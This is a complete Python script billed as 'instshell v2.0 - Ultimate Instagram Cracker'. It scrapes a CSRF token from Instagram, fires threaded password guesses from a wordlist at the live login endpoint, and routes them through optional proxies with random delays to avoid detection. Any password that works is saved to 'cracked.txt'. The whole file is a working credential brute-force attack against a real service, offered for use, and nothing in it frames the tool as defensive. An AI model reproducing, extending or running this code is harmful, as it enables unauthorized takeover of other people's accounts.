Main Cracker: `inst.py`**
```python
#!/usr/bin/env python3
"""
instshell v2.0 - Ultimate Instagram Cracker
GitHub: https://github.com/Khalidhusain786/instshell
Kali Linux Optimized
"""

import requests
import time
import random
import argparse
import sys
import os
from concurrent.futures import ThreadPoolExecutor
import json
from pathlib import Path

class InstShell:
    def __init__(self, username, wordlist, threads=4, proxy=None):
        self.username = username
        self.wordlist = wordlist
        self.threads = threads
        self.proxy = proxy
        self.session = requests.Session()
        self.cracked = False
        self.setup()
        
    def banner(self):
        print("""
╔══════════════════════════════════════════════════════╗
║   🔥 instshell v2.0 - Instagram Cracker 🔥          ║
║        GitHub: Khalidhusain786/instshell            ║
║              Kali Linux Optimized                   ║
╚══════════════════════════════════════════════════════╝
        """)
        
    def setup(self):
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/',
        })
        
    def get_csrf(self):
        try:
            r = self.session.get('https://www.instagram.com/accounts/login/')
            import re
            csrf = re.search(r'"csrf_token":"([^"]+)"', r.text)
            if csrf:
                self.session.headers['X-CSRFToken'] = csrf.group(1)
                return True
        except:
            pass
        return False
    
    def try_password(self, password):
        if self.cracked:
            return None
            
        data = {
            'username': self.username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        proxies = {'http': self.proxy, 'https': self.proxy} if self.proxy else None
        
        try:
            r = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=data,
                proxies=proxies,
                timeout=15
            )
            
            if (r.status_code == 200 and 
                'checkpoint_required' not in r.text and
                ('authenticated":true' in r.text or '"logged_in":1' in r.text)):
                
                self.cracked = True
                result = f"{self.username}:{password}"
                with open('cracked.txt', 'a') as f:
                    f.write(result + '\n')
                print(f"\n🎯 CRACKED! 🎯\n👤 {self.username}\n🔑 {password}")
                return result
                
        except:
            pass
            
        print(f"[{password[:8]}...]", end='\r')
        time.sleep(random.uniform(3, 7))
        return None
    
    def run(self):
        self.banner()
        print(f"🎯 Target: {self.username}")
        print(f"📝 Wordlist: {self.wordlist}")
        
        if not self.get_csrf():
            print("❌ CSRF Failed")
            return
            
        with open(self.wordlist) as f:
            passwords = [l.strip() for l in f if l.strip()]
            
        print(f"🔢 {len(passwords):,} passwords loaded")
        
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            for pwd in passwords:
                if self.cracked:
                    break
                pool.submit(self.try_password, pwd)
                
        if not self.cracked:
            print("\n❌ Not found")

def main():
    parser = argparse.ArgumentParser(description='instshell - Instagram Cracker')
    parser.add_argument('-u', '--user', required=True)
    parser.add_argument('-w', '--wordlist', required=True)
    parser.add_argument('-t', '--threads', type=int, default=4)
    parser.add_argument('--proxy', help='Proxy socks5://ip:port')
    
    args = parser.parse_args()
    
    cracker = InstShell(args.user, args.wordlist, args.threads, args.proxy)
    cracker.run()

if __name__ == '__main__':
    main()
